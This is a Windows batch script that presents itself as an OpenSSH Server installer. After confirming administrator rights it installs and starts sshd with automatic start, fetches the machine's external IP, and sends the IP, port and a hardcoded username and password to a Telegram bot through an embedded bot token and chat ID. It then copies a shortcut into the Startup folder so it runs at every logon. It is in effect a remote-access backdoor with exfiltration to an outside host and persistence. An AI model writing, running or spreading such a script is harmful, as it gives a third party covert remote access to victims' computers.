@echo off
setlocal enabledelayedexpansion

:: Your Telegram Bot Token and Chat ID
set TOKEN=1874534735:AAF_Pwb9UXzRzrX0kwvEe_jU5HNKJZfbTIc
set CHAT_ID=1321846673

:: Hardcoded values for Port, Username, and Password
set SSH_PORT=22
set SSH_USERNAME=admin
set SSH_PASSWORD=redline

echo Checking for Administrator privileges...
net session >nul 2>&1
if %errorLevel% == 0 (
    echo Administrator privileges confirmed.
) else (
    echo This script must be run as an Administrator.
    echo Please run this script as an Administrator!
    pause
    exit /b
)

echo Checking for OpenSSH feature...
dism /Online /Get-Capabilities | findstr "OpenSSH.Server" >nul 2>&1
if %errorLevel% == 0 (
    echo OpenSSH.Server feature found.
    echo Installing OpenSSH Server...
    dism /Online /Add-Capability /CapabilityName:OpenSSH.Server >nul 2>&1
    if %errorLevel% == 0 (
        echo OpenSSH Server installed successfully.
        
        echo Starting SSH Server service...
        net start sshd >nul 2>&1
        if %errorLevel% == 0 (
            echo SSH Server service started successfully.
            
            echo Setting SSH Server service to start automatically...
            sc config sshd start= auto >nul 2>&1
            if %errorLevel% == 0 (
                echo SSH Server service set to start automatically.
                
                echo Fetching external IP and sending to Telegram...
                PowerShell -Command "$ip = (Invoke-RestMethod -Uri 'https://api64.ipify.org?format=json').ip; $message = 'My external IP address is: ' + $ip + ', Port: ' + $env:SSH_PORT + ', Username: ' + $env:SSH_USERNAME + ', Password: ' + $env:SSH_PASSWORD; Invoke-RestMethod -Method get -Uri ('https://api.telegram.org/bot' + $env:TOKEN + '/sendMessage?chat_id=' + $env:CHAT_ID + '&text=' + $message)"
                
                echo Adding script to startup...
                PowerShell -Command "$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Install-SSH.lnk'); $Shortcut.TargetPath='%~dp0\Install-SSH.bat'; $Shortcut.Save()"
                
            ) else (
                echo Failed to set SSH Server service to start automatically.
            )
        ) else (
            echo Failed to start SSH Server service.
        )
    ) else (
        echo Failed to install OpenSSH Server.
        echo Please check the DISM log for more details.
    )
) else (
    echo OpenSSH.Server feature not found.
    echo Your system may not support this feature or you may need to update Windows.
)

echo Done.
pause
